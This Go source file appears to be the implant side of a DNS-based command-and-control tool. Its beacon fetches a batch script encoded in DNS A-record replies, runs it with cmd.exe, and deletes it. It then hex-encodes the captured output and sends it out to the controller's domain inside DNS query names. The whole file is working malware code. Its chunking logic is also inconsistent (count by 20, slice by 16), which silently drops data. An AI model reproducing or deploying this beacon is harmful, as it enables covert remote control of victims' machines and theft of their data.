package beacon

import (
	"os"
	"os/exec"
	"math"
	"math/rand"
	"encoding/hex"
	"fmt"
	"log"
	"strings"
	"strconv"
	"io/ioutil"
	"time"
)

type DnsABeacon struct {
	ip string
	port int
	domain string
	uid string
	tempfile string
}

const domainfmt = "%dID%s%d-%d-%s-%s.%s"

// Send beacon to c2 server and parse output
func (d *DnsABeacon) Beacon() {
	// check for files in upload folder 
	if uploadfiles, _ := ioutil.ReadDir("./upload"); len(uploadfiles) > 0 {
		sendData(d)
	} else {
		// else beacon 
		seq := 0
		initial := fmt.Sprintf(domainfmt, rand.Intn(9998), d.uid, seq, 0, "2D", "2D", d.domain)

		// Get and execute command from DNS Server
		resp := dnsAQuery(d.ip, d.port, initial)

		if resp == "36.37.94.33" {
			// treat all future IPv4 addresses as data
			log.Printf("Starting to receive file to execute")

			// receive data continuously until kill IP
			receiveData(d)
			executeScript(d.tempfile)
		}
	}
}

func receiveData(d *DnsABeacon) {
	var seq = 1
	var file []int 

	for {
		domain := fmt.Sprintf(domainfmt, rand.Intn(9998), d.uid, seq, 0, "2D", "2D", d.domain)
		resp := dnsAQuery(d.ip, d.port, domain)

		if resp == "33.33.94.94" {
			log.Printf("Finished receiving file to execute")
			break
		} else {				
			respsplit := strings.Split(resp, ".")
			for i := 0; i < len(respsplit); i++ {
				data, _ := strconv.Atoi(string(respsplit[i]))
				file = append(file, data)
			}
		}
		seq = seq + 1
		//add in sleep between DNS requests?
		time.Sleep(time.Duration(1) * time.Second)
	}
	//write to file
	filename := "download/" + d.tempfile + ".bat"
	f, _ := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0755)
	command := ""
	for i := 0; i < len(file); i++ {
		command = command + string(file[i])
	}
	f.WriteString(command)
	f.Close()
}

//execute script and delete script
func executeScript(filename string) {
	os.Chdir("./download")

	cmd := exec.Command(`cmd.exe`, `/C`, filename + `.bat`)
	outfile, _ := os.Create("../upload/" + filename + ".txt")
	defer outfile.Close()

	cmd.Stdout = outfile
	cmd.Stderr = outfile
	cmd.Start()
	cmd.Wait()
	
	os.Remove(filename + ".bat")
	os.Chdir("../")
}

//exfiltrate command output and delete file
func sendData(d *DnsABeacon) {
	files, _ := ioutil.ReadDir("./upload")
	for _, file := range files {
		log.Printf("Attempting to upload file %s", file.Name())

		data, _ := ioutil.ReadFile("./upload/"+file.Name())
		encodeddata := hex.EncodeToString(data)
		encodedfilename := hex.EncodeToString([]byte(strings.Replace(file.Name(),".txt", "", -1)))
		totalseq := int(math.Ceil(float64(len(encodeddata)) / float64(20)))

		for i := 0; i < totalseq; i++ {
			endIdx := (i+1)*16
			if endIdx > len(encodeddata) {
				endIdx = len(encodeddata)
			}

			domain := fmt.Sprintf(domainfmt, rand.Intn(9998), d.uid, i+1, totalseq, encodeddata[i*16:endIdx], encodedfilename[:8], d.domain)
						
			log.Printf("Uploading data part %d of %d to %s", i+1, totalseq, domain)
			
			//add in sleep to prevent noise
			dnsAQuery(d.ip, d.port, domain)
		}
		os.Remove("./upload/"+file.Name())		
	}
}
